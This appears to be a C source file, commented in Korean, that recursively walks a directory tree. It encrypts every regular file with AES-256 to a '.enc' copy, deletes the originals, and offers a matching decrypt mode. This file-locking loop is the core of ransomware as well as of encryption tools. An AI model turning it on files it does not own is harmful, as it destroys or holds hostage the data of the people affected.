#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include "crypto.h"
#include "file_ops.h"


#define MAX_PATH 1024

/**
 * @brief 지정된 경로(base_path)로부터 모든 하위 파일과 디렉터리를 재귀적으로 순회
 * @param base_path 탐색을 시작할 디렉터리 경로
 */
void traverse_directory(const char *base_path, operation_mode mode) {
    DIR *dir;
    struct dirent *entry;
    struct stat statbuf;
    char path_buffer[MAX_PATH];

    // 1. 디렉터리 열기
    if ((dir = opendir(base_path)) == NULL) {
        fprintf(stderr, "Error: Cannot open directory %s\n", base_path);
        return;
    }

    // 2. 디렉터리 내의 모든 항목(entry) 읽기
    // 암호화된 파일이 저장될 새 경로 생성 (file.txt -> file.txt.enc)
    char encrypted_path[MAX_PATH + 10]; 
    const char *enc_ext = ".enc";
    while ((entry = readdir(dir)) != NULL) {
        // 3. 무한 재귀 방지: '.' (현재) 및 '..' (상위) 디렉터리 무시
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        
        // 4. 전체 경로 생성 (예: "current_dir" + "/" + "filename")
        snprintf(path_buffer, sizeof(path_buffer), "%s/%s", base_path, entry->d_name);

        // 5. 파일/디렉터리의 상세 정보(stat) 가져오기
        if (stat(path_buffer, &statbuf) != 0) {
            fprintf(stderr, "Error: Cannot get stat for %s\n", path_buffer);
            continue;
        }

        // 6. 파일 타입 확인
        if (S_ISDIR(statbuf.st_mode)) {
            // 항목이 디렉터리일 경우
            printf("DIR : %s\n", path_buffer);
            
            // 재귀 호출: 해당 디렉터리 내부로 다시 탐색 시작
            traverse_directory(path_buffer, mode);
        }
        else if (S_ISREG(statbuf.st_mode)) {
            // 디버깅
            // printf("FILE: %s\n", path_buffer);

            // 항목이 일반 파일일 경우
            if (mode == MODE_ENCRYPT) { // [암호화 로직]
                // .enc 확장자면 넘어감
                if (strstr(path_buffer, enc_ext) != NULL) {
                    continue; 
                }
                // 나중에는 기존 확장자를 암호문 뒤에 저장하도록 해서, .txt.enc -> .enc로 변경
                snprintf(encrypted_path, sizeof(encrypted_path), "%s.enc", path_buffer);

                // crypto 모듈의 함수 호출
                if (encrypt_file_aes256(path_buffer, encrypted_path) == 0) {
                    printf("  -> Encrypted: %s\n", encrypted_path);
                    
                    // 원본 파일 삭제 -> 임의 값으로 변경
                    remove(path_buffer); 
                }
                else fprintf(stderr, "  -> Encryption FAILED for %s\n", path_buffer);
            }
            else if (mode == MODE_DECRYPT) { // [복호화 로직]
                if (strstr(path_buffer, enc_ext) != NULL) {
                    // 복호화될 원본 파일 경로 생성 (예: file.txt.enc -> file.txt)
                    char decrypted_path[MAX_PATH];
                    size_t original_len = strlen(path_buffer) - strlen(enc_ext);
                    strncpy(decrypted_path, path_buffer, original_len);
                    decrypted_path[original_len] = '\0'; // Null-terminate

                    // crypto 모듈의 복호화 함수 호출
                    if (decrypt_file_aes256(path_buffer, decrypted_path) == 0) {
                        printf("  -> Decrypted: %s\n", decrypted_path);
                        
                        // 암호화된 파일(.enc) 삭제
                        remove(path_buffer);
                    } else fprintf(stderr, "  -> Decryption FAILED for %s\n", path_buffer); 
                }
            }
        }
        else printf("OTHER: %s\n", path_buffer); // (심볼릭 링크, 소켓 등 기타 파일 타입은 무시)
    }

    // 7. 디렉터리 닫기
    closedir(dir);
}